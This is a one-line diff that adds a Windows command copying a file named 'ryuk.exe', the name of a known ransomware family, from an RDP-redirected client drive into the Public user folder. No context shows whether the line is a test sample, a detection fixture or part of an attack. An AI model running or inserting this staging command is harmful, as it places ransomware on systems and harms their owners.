@@ -1,0 +1,1 @@
+cmd /c "copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe"
